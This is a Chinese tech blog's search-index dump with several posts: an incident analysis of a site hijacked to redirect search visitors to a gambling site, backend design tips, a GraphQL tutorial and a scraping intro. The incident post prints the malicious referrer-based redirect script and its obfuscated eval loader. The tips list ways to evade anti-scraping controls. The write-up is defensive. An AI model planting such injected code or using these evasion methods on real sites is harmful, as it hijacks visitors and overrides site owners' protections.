看到这几个表格的时候会有点儿晕，开发的时候需要特别注意下类型比较，对等比较尽量用'==='，一些","date":"2019-02-17","objectID":"/posts/2019-02-17-dahua-php/:0:3","tags":["PHP"],"title":"大话转岗PHP开发小结","uri":"/posts/2019-02-17-dahua-php/"},{"categories":["安全"],"content":"起因，在下班准备回家之际，收到几条朋友发来的信息，说他的网站在百度搜索做信息流广告推广，但是从百度搜索点击打开就会跳转的博彩网站，让我帮忙排查下问题，是不是被挂马了，于是乎就开始了后面的故事 为了保护网站隐私，假定网站地址是：http://www.xxx.com 收到消息后我尝试操作并收集到下面现象内容： 现象 1：通过域名直接打开网站，可以正常打开，不会跳转到博彩站 现象 2：通过百度/搜狗搜索引擎，搜索到网站后点击打开就会跳转到博彩站 开始排查 网站是怎么跳转的？ 网站跳转无非就是这两种：服务端重定向跳转/前端 JS 触发跳转，我开始用 Charles 抓包，列出抓包请求发起顺序大概是这样的（省略无关的请求）： http://www.xxx.com https://www.cpdas8.com/cxc.js https://www.das8cx.com/ [博彩站] 先打开站点www.xxx.com返回Code=200，不是服务端重定向Code=302，是由前端发起跳转，并且注意到：cxc.js，请求头Referer=www.xxx.com，这个并非站点前端开发需要引入的脚本，打开地址看代码如下： (function () { /*百度推送代码*/ var bp = document.createElement(\"script\"); bp.src = \"//push.zhanzhang.baidu.com/push.js\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(bp, s); /*360推送代码*/ var src = document.location.protocol + \"//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9\"; document.write('\u003cscript src=\"' + src + '\" id=\"sozz\"\u003e\u003c/script\u003e'); })(); document.writeln('\u003cscript LANGUAGE=\"Javascript\"\u003e'); document.writeln(\"var s=document.referrer\"); document.writeln( 'if(s.indexOf(\"baidu\")\u003e0 || s.indexOf(\"sogou\")\u003e0 || s.indexOf(\"soso\")\u003e0 ||s.indexOf(\"sm\")\u003e0 ||s.indexOf(\"uc\")\u003e0 ||s.indexOf(\"bing\")\u003e0 ||s.indexOf(\"yahoo\")\u003e0 ||s.indexOf(\"so\")\u003e0 )' ); document.writeln('location.href=\"https://www.das8cx.com/\";'); document.writeln(\"\u003c/script\u003e\"); 看代码就知道抓到了元凶，这里执行了 location.href 到博彩站，但是看主页 html 源码里并没有 cxc.js 的引入，继续后面的排查 cxc.js 是如何在主页里引入的？ 带着这个疑问，打开了首页源码，大概过了下，没有发现引入脚本的地方，就开始怀疑是不是动态引入的，再次查看源码，看到一段被混淆加密压缩过代码： eval( (function (p, a, c, k, e, d) { e = function (c) { return ( (c \u003c a ? \"\" : e(parseInt(c / a))) + ((c = c % a) \u003e 35 ? String.fromCharCode(c + 29) : c.toString(36)) ); }; if (!\"\".replace(/^/, String)) { while (c--) d[e(c)] = k[c] || e(c); k = [ function (e) { return d[e]; }, ]; e = function () { return \"\\\\w+\"; }; c = 1; } while (c--) if (k[c]) p = p.replace(new RegExp(\"\\\\b\" + e(c) + \"\\\\b\", \"g\"), k[c]); return p; })( 'l[\"\\\\d\\\\e\\\\1\\\\m\\\\j\\\\8\\\\n\\\\0\"][\"\\\\6\\\\4\\\\9\\\\0\\\\8\"](\\'\\\\i\\\\2\\\\1\\\\4\\\\9\\\\3\\\\0 \\\\0\\\\k\\\\3\\\\8\\\\c\\\\7\\\\0\\\\8\\\\h\\\\0\\\\5\\\\f\\\\b\\\\q\\\\b\\\\2\\\\1\\\\4\\\\9\\\\3\\\\0\\\\7 \\\\2\\\\4\\\\1\\\\c\\\\7\\\\o\\\\0\\\\0\\\\3\\\\2\\\\p\\\\5\\\\5\\\\6\\\\6\\\\6\\\\a\\\\1\\\\3\\\\d\\\\b\\\\2\\\\r\\\\a\\\\1\\\\e\\\\j\\\\5\\\\1\\\\h\\\\1\\\\a\\\\f\\\\2\\\\7\\\\g\\\\i\\\\5\\\\2\\\\1\\\\4\\\\9\\\\3\\\\0\\\\g\\');', 28, 28, \"x74|x63|x73|x70|x72|x2f|x77|x22|x65|x69|x2e|x61|x3d|x64|x6f|x6a|x3e|x78|x3c|x6d|x79|window|x75|x6e|x68|x3a|x76|x38\".split( \"|\" ), 0, {} ) ); 感觉事蹊跷，不管三七二十一先到谷歌开发者工具控制台里执行看看，截取重要提示信息： A parser-blocking, cross site (i.e. different eTLD+1) script,https://www.cpdas8.com/cxc.js, is invoked via document.write 明了了，就是这段脚本把 cxc.js 动态的引入到站点里，现在跳转的原因是找到了，但是为啥会好端端的多了这段代码，继续后面的分析 为什么主页源码会被篡改加入了一段脚本呢？ 站点是通过阿里云服务器的虚拟空间进行部署的，服务器本身应该没有问题 目前猜测有两种可能性： FTP 暴力破解，成功连接上 FTP 后进行篡改 站点安全漏洞，被上传了木马程序后被执行，篡改了源码 后面问了下 FTP 密码是设置的挺简单的，所以评估可能是 FTP 暴力破解导致，细思极恐 番外，里面还有段篡改 SEO 关键词代码，这里也需要去掉： 篡改了 keyword/description/title 问题总结： 通过抓包和代码分析可以知道跳转到博彩站的流程是这样的： 打开首页，脚本执行了 evel(混淆加密压缩)，动态引入 cxc.js 引入的 cxc.js 里执行了(function (){/_ 跳转逻辑 _/})()，如果站点 referrer 是搜索引擎过来的就跳转到博彩站，不是就不做跳转直接正常打开站点 知道原理后就很清晰明白上面现象的原因，并且可以很清楚的怎么去修复 站点源码被侵入篡改问题： 站点的开发需要注意 WEB 安全问题，文件上传漏洞，脚本注入，SQL 注入，跨站攻击，等 站点的服务器/FTP/后台账号密码，不要设置的太随意，要有一定的复杂度，不然很容易被暴力破解 常见木马类型： 大马 大马体积比较大 一般 50K 以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序 小马 小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用 nginx 或者 IIS6 的解析漏洞来运行，不过功能少，一般只有上传等功能 一句话木马 一句话木马属于 就一句话的脚本语句 代码少 就是一句话木马属于小马 查杀工具： 护卫神·云查杀 D 盾 辅助手段-网站安全检测： 华为漏洞扫描服务 360 网站安全 百度网站体检 百度云观测 ","date":"2018-09-13","objectID":"/posts/2018-09-13-anquan-guama/:0:0","tags":["挂马","篡改"],"title":"记一次站点被挂马问题排查","uri":"/posts/2018-09-13-anquan-guama/"},{"categories":["总结"],"content":"Hi，大家好，很荣幸有这个机会可以通过写博文的方式，把这些年在后端开发过程中总结沉淀下来的经验和设计思路分享出来 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:0:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"模块化设计 根据业务场景，将业务抽离成独立模块，对外通过接口提供服务，减少系统复杂度和耦合度，实现可复用，易维护，易拓展 项目中实践例子： Before： 在返还购 APP 里有个【我的红包】的功能，用户的红包数据来自多个业务，如：邀请新用户注册领取 100 元红包，大促活动双倍红包，等各种活动红包，多个活动业务都实现了一套不同规则的红包领取和红包奖励发放的机制，导致红包不可管理，不能复用，难维护难拓展 After： 重构红包业务 红包可后台管理 红包信息管理，可添加，可编辑，可配置红包使用的规则，可管理用户红包 红包奖励发放统一处理 应用业务的接入只需要专注给用户进行红包发放即可 设计概要 Before VS After 产品有时提出的业务需求没有往这方面去考虑，结合场景和未来拓展需要，在需求讨论的时候提出模块化设计方案，并可以协助产品进行设计 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:1:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"通用服务抽离 在项目开发中经常会遇到些类似的功能，但是不同的开发人员都各自实现，或者因为不能复用又重新开发一个，导致了类似功能的重复开发，所以我们需要对能够抽离独立服务的功能进行抽离，达到复用的效果，并且可以不断拓展完善，节约了后续开发成本，提高开发效率，易于维护和拓展 项目中实践例子： Before 在业务中经常需要对用户进行信息通知，如：短信定时通知，APP 消息推送，微信通知，等 开发人员在接到需求中有通知功能的时候没有考虑后续拓展，就接入第三方信息通知平台，然后简单封装个信息通知方法，后续也有类似信息通知需求的时候，另一个开发人员发现当前这个通知方法无法满足自己的需求，然后又自己去了解第三方平台重新封装了通知方法，或者后续需求加了定时通知的功能，开发人员针对业务去实现了个定时通知功能，但是只能自己业务上使用，其他业务无法接入，没有人去做这块功能的抽离，久而久之就演变成功能重复开发，且不易于维护和拓展 After 接触到这种可以抽离通用服务需求的时候，就会与产品确认这种需求是否后续会存在类似的需要，然后建议这把块需求抽离成通用服务，方便后续维护和拓展 设计概要 Before VS After ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:1:1","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"架构独立服务 项目开发过程中有些需求是与所在项目业务无关，如：收集用户行为习惯，收集商品曝光点击，数据收集提供给 BI 进行统计报表输出，公用拉新促活业务（柚子街和返还公用），类似这种需求，我们结合应用场景，考虑服务的独立性，以及未来的拓展需要，架构独立项目进行维护，在服务器上独立分布式部署不影响现有主业务服务器资源 项目中实践例子： 架构用户行为跟踪独立服务，在开发前预估了下这个服务的请求量，并会有相对大量的并发请求 架构方案： 项目搭建选择用 nodejs 来做服务端 单进程，基于事件驱动和无阻塞 I/O，所以非常适合处理并发请求 负载均衡：cluster 模块/PM2 架构 nodejs 独立服务 提供服务接口给客户端 接口不直接 DB 操作，保证并发下的稳定性 数据异步入库 通过程序把数据从：消息队列=\u003emysql nodejs+express+redis(list)/mq+mysql 用户行为跟踪服务的服务架构图 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:2:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"高并发优化 高并发除了需要对服务器进行垂直扩展和水平扩展之外，作为后端开发可以通过高并发优化，保证业务在高并发的时候能够稳定的运行，避免业务停滞带来的损失，给用户带来不好的体验 缓存： 服务端缓存 内存数据库 redis memcache 方式 优先缓存 穿透 DB 问题 只读缓存 更新/失效删除 注意 内存数据库的分配的内存容量有限，合理规划使用，滥用最终会导致内存空间不足 缓存数据需要设置过期时间，无效/不使用的数据自动过期 压缩数据缓存数据，不使用字段不添加到缓存中 根据业务拆分布式部署缓存服务器 客户端缓存 方式 客户端请求数据接口，缓存数据和数据版本号，并且每次请求带上缓存的数据版本号 服务端根据上报的数据版本号与数据当前版本号对比 版本号一样不返回数据列表，版本号不一样返回最新数据和最新版本号 场景： 更新频率不高的数据 服务端缓存架构图 异步 异步编程 方式： 多线程编程 nodejs 异步编程 场景： 参与活动成功后进行短信通知 非主业务逻辑流程需要的操作，允许异步处理其他辅助业务，等 业务异步处理 方式 业务接口将客户端上报的数据 PUSH 到消息队列（MQ 中间件），然后就响应结果给用户 编写独立程序去订阅消息队列，异步处理业务 场景： 大促活动整点抢限量红包 参与成功后委婉提示：预计 X 天后进行红包发放 并发量比较大的业务，且没有其他更好的优化方案，业务允许异步处理 注意： 把控队列消耗的进度 保证幂等性和数据最终一致性 缺陷： 牺牲用户体验 【业务异步处理】架构图 【业务异步处理】除了可以在高并发业务中使用，在上面通用服务的设计里也是用这种架构方式 限流 在类秒杀的活动中通过限制请求量，可以避免超卖，超领等问题 高并发的活动业务，通过前端控流，分散请求，减少并发量 服务端限流 redis 计数器 如：类秒杀活动 客户端控流 通过参与活动游戏的方式 红包雨/小游戏，等方式 服务降级 当服务器资源消耗已经达到一定的级别的时候，为了保证核心业务正常运行，需要丢卒保车，弃车保帅，服务降级是最后的手段，避免服务器宕机导致业务停滞带来的损失，以及给用户带来不好的体验 业务降级 从复杂服务，变成简单服务 从动态交互，变成静态页面 分流到 CDN 从 CDN 拉取提前备好的 JSON 数据 引导到 CDN 静态页面 停止服务 停止非核心业务，并进行委婉提示 高并发优化概要图 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:3:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"防刷/防羊毛党 大多数公司的产品设计和程序猿对于推广活动业务的防刷意识不强，在活动业务设计和开发的过程中没有把防刷的功能加入业务中，给那些喜欢刷活动的人创造了很多的空子 等到你发现自己被刷的时候，已经产生了不小的损失，少则几百几千，多则几万 随着利益的诱惑，现在已经浮现了一个新的职业“刷客”，专业刷互联网活动为生，养了 N 台手机+N 个手机号码+N 个微信账号，刷到的奖励金进行提现，刷到活动商品进行低价转手处理，开辟了一条新的灰色产业链 我们要拿起武器(代码)进行自我的防御，风控，加高门槛，通过校验和限制减少风险发生的各种可能性，减少风险发生时造成的损失 这里列出常用套路（具体应用结合业务场景）： 校验请求合法性 请求参数合法性判断 请求头校验 user-agent referer … … 签名校验 对请求参数进行签名 设备限制 IP 限制 微信 unionid/openid 合法性判断 验证码/手机短信验证码 牺牲体验 自建黑名单系统过滤 业务风控 限制设备/微信参与次数 限制最多奖励次数 奖池限制 根据具体业务场景设计… … 应对角色 普通用户 技术用户 专业刷客 目前还没有很好的限制方式 防刷/防羊毛党套路概要图 附加 APP/H5 中签名规则应该由客户端童鞋开发，然后拓展 API 给前端 JS 调用，在 H5 发起接口请求的时候调用客户端拓展的签名，这样可以避免前端 JS 里构造签名规则而被发现破解 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:4:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"并发问题 多操作 场景： 当==同用户==多次触发点击，或者通过模拟并发请求，就会出现多操作的问题，比如：签到功能，一天只能签到一次，可以获得 1 积分，但是并发的情况下会出现用户可以获得多积分的问题 剖析： 简化签到逻辑一般是这样的： 查询是否有签到记录 –\u003e 否 –\u003e 添加今日签到记录 –\u003e 累加用户积分 –\u003e 签到成功 查询是否有签到记录 –\u003e 是 –\u003e 今日已经签到过 假设这个时候用户 A 并发两个签到请求，这时会同时进入到 【查询是否有签到记录】，然后同时返回否，就会添加两条的签到记录，并且多累加积分 解决方案： 最理想简单的方案，只需要在签到记录表添加【签到日期】+【用户 ID】的组合唯一索引，当并发的时候只有会一条可以添加成功，其他添加操作会因为唯一约束而失败 库存负数 场景： 当==多用户==并发点击参与活动，如：抽奖活动，这个时候奖品只有一个库存了，理论上只有一个用户可以获得，但是并发的时候往往会出现他们都成功获得奖品，导致奖品多支出，加大了活动成本 剖析： 有问题的逻辑流程一般是这样的： 中奖 –\u003e 查询奖品库存 –\u003e 有 –\u003e 更新奖品库存 –\u003e 添加中奖纪录 –\u003e 告知中奖 中奖 –\u003e 查询奖品库存 –\u003e 无 –\u003e 告知无中奖 假设抽奖活动，当前奖品 A 只有最后一个库存，然后用户 A、B、C，同时参与活动同时中奖奖品都是 A，这个时候查询商品库存是存在 1 个，就会进行更新库存，添加中奖纪录，然后就同时中奖了 解决方案： 最理想根本就不需要用多做一个库存的 SELECT 奖品库存操作，只需要 UPDATE 奖品库存-1 WHERE 奖品库存\u003e=1，UPDATE 成功后就说明是有库存的，然后再做后续操作，并发的时候只会有一个用户 UPDATE 成功 总结： 在开发业务接口的时候需要把==同用户==和==多用户==并发的场景考虑进去，这样就可以避免在并发的时候产生数据异常问题，导致成本多支出 可以使用下面的工具进行模拟并发测试： Apache JMeter Charles Advanced Repeat Visual Studio 性能负载 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:5:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"数据采集技巧（番外） 普遍方案 获取平台数据接口 模拟接口请求 数据解析过滤 数据构造入库 使用 selenium+Headless 自动化测试框架 开发 推荐用 python 开发 python+selenium+headless 控制请求频率，避免被平台限制请求 使用代理 IP，绕过请求 IP 限制 优点 无需模拟接口请求 无法攻克数据接口模拟请求(加密签名等) 接口版本频繁变化(需要重新调研) 平台接口/页面版本变化，可以快速调整 只需要调整采集数据所在的 HTML 元素的位置(class/id) 可以用户操作/选中/点击/模拟登陆，等 登陆失效后可以模拟登陆 可以发送登陆二维码到钉钉进行扫码登录 应用场景： 竞品数据采集 淘宝商品价格和自建商品库后台价格监控 淘宝领券金额和自建商品库后台券金额监控 … … 反反爬虫 在做数据采集的过程中，有些平台会对重要数据的请求设置反爬虫策略，避免数据被竞品挖掘和利用，以及消耗大量资源拖垮服务器， 反爬虫和反反爬虫是技术之间的较量，这场没有硝烟的战争永不停息。（程序员何必为难程序员） 反爬虫可以分为以下两种 服务端限制 服务器端行请求限制，防止爬虫进行数据请求 前端限制 前端通过 CSS 和 HTML 标签进行干扰混淆关键数据，防止爬虫轻易获取数据 破解服务端限制： 模拟设置请求头 Referer User-Agent Authorization ….. 破解签名 签名规则 在 JS 中找到签名规则 控制请求平率 调整请求时间，延迟请求 代理 IP 切换请求的代理 IP，自建/第三方 登录限制 带上登录成功后的 Cookie/Authorization 验证码限制 识图，基于库/第三方 投毒破解 为了防止被投毒，需要对数据进行抽样校验 破解前端限制： font-face，自定义字体干扰 找到 ttf 字体文件地址，然后下载下来，使用 font 解析模块包对 ttf 文件进行解析，与文字编码进行映射出中文 伪元素隐藏式 在 CSS 里找到 xxxx::before {content: “中文”;}对应的中文 backgroud-image 移量 通过背景图片的 position 位置偏移量和图片中的内容进行映射 html 标签干扰 过滤掉干扰混淆的 HTML 标签，或者只读取有效数据的 HTML 标签的内容 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:6:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["总结"],"content":"总结 作为后端开发者，不仅是完成需求功能开发，要结合业务场景进行合理设计，架构未来，对核心业务进行压测优化，以保证业务在并发下能够正常运行，同时要考虑安全问题以及防刷，防羊毛党，在编码上避免坏代码味道，面相抽象开发，适当使用设计模式，避免技术债 开发应该铭记于心的精句： 技术的存在价值，是让技术推动业务增长，实现公司盈利增长 没有最好的架构只有最适合的架构 开发语言只是工具，在适合的场景中使用适合的工具 抽象思维是从具体存在的各不相同的问题当中洞察问题的本质，理解产品需求的深层次模型，治本而不是治标 知识很重要，她虽然不能直接给你财富，但是可以给你很多机会，活到老学到老 ","date":"2018-05-23","objectID":"/posts/2018-05-23-shared-experience/:7:0","tags":["经验沉淀"],"title":"大话后端开发的奇淫技巧大集合","uri":"/posts/2018-05-23-shared-experience/"},{"categories":["GraphQL"],"content":"GraphQL 是什么？ GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时（来自：官方解释） 理解起来就是，GraphQL 有自己查询语法，发起的 API 请求中通过传递查询语句来告诉服务端需要哪些操作和具体数据字段，GraphQL 定义了实现规范，各种的语言分别实现了 GraphQL 功能框架，通过框架可以对查询语法进行解释执行，然后返回数据输出给客户端 ","date":"2018-04-20","objectID":"/posts/2018-04-20-graphql/:0:1","tags":["GraphQL"],"title":"大话GraphQL新手上车","uri":"/posts/2018-04-20-graphql/"},{"categories":["GraphQL"],"content":"GraphQL 的优势 以下所有查询和输出都是来自我的 DEMO，DEMO 的实现和源码 Github 地址下面会提到 语法特性满足各种需求 支持多操作：query-\u003e查询，mutation-\u003e修改，规范是写在查询语句前，默认不写就是 query 支持参数，实现各种功能，比如：查询数据，排序，分页，… …等 语法其他特性，别名，片段，定义变量，指令，… …等 # 查询语句-有参数 query{ student(id:86){ id name sclass{ id num level heads } } } # 输出 { \"data\": { \"student\": { \"id\": 86, \"name\": \"Emma\", \"sclass\": { \"id\": 9, \"num\": 8, \"level\": 3, \"heads\": 68 } } } } # 修改 mutation { update(id: 86, name: \"66666\") { rt msg } } # 输出 { \"data\": { \"update\": { \"rt\": 1, \"msg\": \"bingo\" } } } 查询友好性，查询和输出关联 看查询语句是不是感觉有点儿 JSON 的味道？查询语法类 JSON 格式，前后端都可以很容易上手，查询语句和输出数据有紧密的关联性，通过分析查询语句就知道输出的数据内容字段有哪些 灵活性，请求你所要的数据，不多不少 可以自定义查询语句来获取需要使用的字段，避免无用字段的输出，减少不必要数据块/数据字段查询逻辑 多字段 # 查询语句 query{ students{ id name classid sclass{ id num level heads } } } # 输出 { \"data\": { \"students\": [ { \"id\": 19, \"name\": \"Savannah\", \"classid\":22, \"sclass\": { \"id\": 22, \"num\": 6, \"level\": 4, \"heads\": 57 } }, { \"id\": 34, \"name\": \"Ariana\", \"classid\":33, \"sclass\": { \"id\": 33, \"num\": 3, \"level\": 4, \"heads\": 57 } } ] } } 去掉了不使用的字段输出，少了字段 sclass，就可以不进行 sclass 数据查询 # 查询语句 query{ students{ id name } } # 输出 { \"data\": { \"students\": [ { \"id\": 19, \"name\": \"Savannah\" }, { \"id\": 34, \"name\": \"Ariana\" } ] } } API 演进，无需划分版本 API 版本迭代无需要进行版本号区分，添加字段不影响现有查询，请求发起者可以自己定义想要的查询信息 # Say No http://api.xxx.com/student/v1/ http://api.xxx.com/student/v2/ # ... 自检性，可查询输出所有定义 这个是 GraphQL 一个很 Nice 的特性，就是 GraphQL 服务 API 可以通过语句查询出它所支持的类型，开发可以不需要花时间写 API 文档，GraphQL 直接帮助开发者快速了解 API。 # 查询语句 { __type(name: \"MStudentType\") { kind name fields { name description type { name } } } } # 输出 { \"data\": { \"__type\": { \"kind\": \"OBJECT\", \"name\": \"MStudentType\", \"fields\": [ { \"name\": \"id\", \"description\": \"学号\", \"type\": { \"name\": null } }, { \"name\": \"name\", \"description\": \"学生名\", \"type\": { \"name\": null } }, { \"name\": \"age\", \"description\": \"年龄\", \"type\": { \"name\": null } }, { \"name\": \"birthdate\", \"description\": \"生日\", \"type\": { \"name\": null } }, { \"name\": \"sclass\", \"description\": \"班级信息\", \"type\": { \"name\": \"MClassType\" } } ] } } } 基于自检性，GraphQL 开源了辅助工具 GraphiQL，方便 GraphQL 接口调试和自动生成接口文档 GraphQL 辅助工具：GraphiQL，可以调试查询语句，并对接口定义的 schema 进行文档可视化展示 查询语句进行感知 错误提示 语句格式化 执行查询 查看接口定义的 schema 文档信息 graphql-dotnet 开源项目里的 GraphiQL 要接入自己开发 GraphQL 接口，还需要进行简单的修改调整，后面会说到 ","date":"2018-04-20","objectID":"/posts/2018-04-20-graphql/:0:2","tags":["GraphQL"],"title":"大话GraphQL新手上车","uri":"/posts/2018-04-20-graphql/"},{"categories":["GraphQL"],"content":".NET 下的入门教程 构建 ASP.NET MVC5 WebAPI 项目 NutGet 引入程序包 GraphQL GenFu，用于初始化测试数据 基于 GraphQL 简单实现一个学生查询 API 支持查询学生信息列表 支持查询学生的班级信息 支持查询学号对应的学生信息 支持修改学生名字 定义【数据类】MStudent.cs(学生类)，MClass.cs(班级类)，MResult.cs(执行结果类) public class MStudent { /// \u003csummary\u003e /// 学号 /// \u003c/summary\u003e public int Id { get; set; } /// \u003csummary\u003e /// 名字 /// \u003c/summary\u003e public string Name { get; set; } /// \u003csummary\u003e /// 年龄 /// \u003c/summary\u003e public int Age { get; set; } /// \u003csummary\u003e /// 所在班级编号 /// \u003c/summary\u003e public int ClassId { get; set; } /// \u003csummary\u003e /// 生日 /// \u003c/summary\u003e public DateTime Birthdate { get; set; } /// \u003csummary\u003e /// 班级 /// \u003c/summary\u003e public MClass SClass { get; set; } } public class MClass { public int Id { get; set; } /// \u003csummary\u003e /// 年级 /// \u003c/summary\u003e public int Level { get; set; } /// \u003csummary\u003e /// 第几班 /// \u003c/summary\u003e public int Num { get; set; } /// \u003csummary\u003e /// 总人数 /// \u003c/summary\u003e public int Heads { get; set; } } public class MResult { /// \u003csummary\u003e /// 输出结果,0=失败，1=成功 /// \u003c/summary\u003e public int rt { get; set; } /// \u003csummary\u003e /// 说明信息 /// \u003c/summary\u003e public string msg { get; set; } } 定义 GraphType 类 MStudentType,MClassType,MResultType 继承 ObjectGraphType，TSourceType 泛型对应到【数据类】 构造函数里通过 Field 去添加可以被查询的数据字段，包括：描述以及字段内容获取的处理方法，等 public class MStudentType : ObjectGraphType\u003cMStudent\u003e { private static BStudent _bll { get; set; } public MStudentType() { if (_bll == null) _bll = new BStudent(); Field(d =\u003e d.Id).Description(\"学号\"); Field(d =\u003e d.Name).Description(\"学生名\"); Field(d =\u003e d.Age).Description(\"年龄\"); Field(d =\u003e d.Birthdate).Description(\"生日\"); Field\u003cMClassType\u003e(\"sclass\", resolve: d =\u003e { //缓存中已经存在就直接返回 if (d.Source.SClass != null) return d.Source.SClass; //从DB/缓存中获取数据 var classId = d.Source?.ClassId ?? 0; if (classId \u003e 0) d.Source.SClass = _bll.GetClass(d.Source.ClassId); return d.Source.SClass; },description:\"班级信息\"); } } public class MClassType : ObjectGraphType\u003cMClass\u003e { public MClassType() { Field(d =\u003e d.Level).Description(\"年级\"); Field(d =\u003e d.Heads).Description(\"人数\"); Field(d =\u003e d.Id).Description(\"编号\"); Field(d =\u003e d.Num).Description(\"班级\"); } } public class MResultType : ObjectGraphType\u003cMResult\u003e { public MResultType() { Field(d =\u003e d.rt); Field(d =\u003e d.msg); } } 定义 Schema 的操作类(query/mutation)，继承 ObjectGraphType，有：StudentQuery，StudentMutation public class StudentQuery : ObjectGraphType { public StudentQuery(BStudent bll) { //查询-有参数id Field\u003cMStudentType\u003e(\"student\", arguments: new QueryArguments(new QueryArgument\u003cIntGraphType\u003e() { Name = \"id\" }), resolve: d =\u003e { var id = d.Arguments[\"id\"].GetInt(0, false); return bll.GetModel(id); ; }); //查询-列表 Field\u003cListGraphType\u003cMStudentType\u003e\u003e(\"students\", resolve: d =\u003e { return bll.GetStudents(); }); } } } public class StudentMutation : ObjectGraphType { public StudentMutation(BStudent bll) { Field\u003cMResultType\u003e(\"update\", arguments: new QueryArguments( new QueryArgument\u003cIntGraphType\u003e { Name = \"id\" }, new QueryArgument\u003cStringGraphType\u003e { Name = \"name\" } ), resolve: (d) =\u003e { var id = d.Arguments[\"id\"].GetInt(0, false); var name = d.Arguments[\"name\"].GetString(\"\"); if (id \u003c= 0) return new MResult { rt = 0, msg = \"非法学号\" }; if (name.IsNullOrWhiteSpace()) return new MResult { rt = 0, msg = \"非法名字\" }; var isSc = bll.UpdateName(id, name); if (!isSc) return new MResult { rt = 0, msg = \"更新失败\" }; return new MResult { rt = 1, msg = \"bingo\" }; }); } } 在控制器里添加接口，构造 Schema 对象，根据查询条件解析执行返回结果输出 Query = StudentQuery，Mutation = StudentMutation /// \u003csummary\u003e /// graphql demo 接口 /// \u003c/summary\u003e /// \u003creturns\u003e\u003c/returns\u003e [HttpPost] [Route(\"query\")] public object Test_Query() { var r = HttpContext.Current.Request; var query = r.GetF(\"query\"); var bll = new BStudent(); var schema = new Schema { Query = new StudentQuery(bll), Mutation = new StudentMutation(bll) }; var result = new DocumentExecuter() .ExecuteAsync(options =\u003e { options.Schema = schema; options.Query = query; }).GetAwaiter(); var json = new DocumentWriter(indent: true).Write(result); return result.GetResult(); } GraphiQL 工具的接入 Git Clone graphql-dotnet 安装 NodeJS 环境 命令工具 CMD 打开 graphql-dotnet/src/Gr","date":"2018-04-20","objectID":"/posts/2018-04-20-graphql/:0:3","tags":["GraphQL"],"title":"大话GraphQL新手上车","uri":"/posts/2018-04-20-graphql/"},{"categories":["GraphQL"],"content":"总结 对于应用我觉得可以尝试使用到新项目需求中，或者现有合适应用场景进行重构，等服务运行稳定，并且开发上手后即可进行大范围的使用 对于 RestFul 和 GraphQL 的比较，我觉得没有最好的协议，只有最合适的场景 ","date":"2018-04-20","objectID":"/posts/2018-04-20-graphql/:0:4","tags":["GraphQL"],"title":"大话GraphQL新手上车","uri":"/posts/2018-04-20-graphql/"},{"categories":["GraphQL"],"content":"资源 Demo 源码： Demo 代码到我的 Gtihub 项目（GraphQLDemo） 学习资料 知乎-什么是 GraphQL GraphQL 语法入门 GraphQL 中文官网 How To GraphQL GraphQL 搭配 Koa 最佳入门实践 ","date":"2018-04-20","objectID":"/posts/2018-04-20-graphql/:0:5","tags":["GraphQL"],"title":"大话GraphQL新手上车","uri":"/posts/2018-04-20-graphql/"},{"categories":["爬虫"],"content":" 图 1-意淫爬虫与反爬虫间的对决 数据的重要性 如今已然是大数据时代，数据正在驱动着业务开发，驱动着运营手段，有了数据的支撑可以对用户进行用户画像，个性化定制，数据可以指明方案设计和决策优化方向，所以互联网产品的开发都是离不开对数据的收集和分析，数据收集的一种是方式是通过上报 API 进行自身平台用户交互情况的捕获，还有一种手段是通过开发爬虫程序，爬取竞品平台的数据，后面就重点说下爬虫的应用场景和实践中会遇到的问题和反反爬虫的一些套路与技巧。 应用场景 互联网平台，偏向销售公司，客户信息的爬取 客户信息的爬取可以释放销售人员寻找客户资源的时间，提高销售对市场开发的效率 爬取相关平台上的客户信息，上报到 CRM 管理系统，提供给销售人员进行开发 资讯爬取并应用到平台业务中 经常浏览资讯的时候会发现其实很多平台的热门资讯内容都很相似，尊重版权的平台，会标明来源出处 爬取资讯信息，应用到资讯业务中，可以减轻资讯内容编辑人员的压力，如果不需要创造自己的内容，也可全部托管给程序 AI 运营 竞品公司重要数据挖掘分析与应用 竞品平台重要业务数据，如：汽车 X 家的车型信息，X 哪儿的酒店信息，返 X 网的商品信息，… … 爬取竞品重要数据，对数据进行筛选和处理，然后投入业务中展示，增加这块业务数据量，减轻这块资源的运营编辑的压力 … … 爬虫开发 python 开发爬虫(推荐) 入门也比较简单，代码短小精干，各种便于爬虫开发的模块和框架 其他语言 很多语言也都可以开发爬虫，但是均都不是很全面，根据实际技术栈和开发场景去使用，语言只是工具，思路才是通用的 爬虫必备技巧 做爬虫开发，需要对 WEB 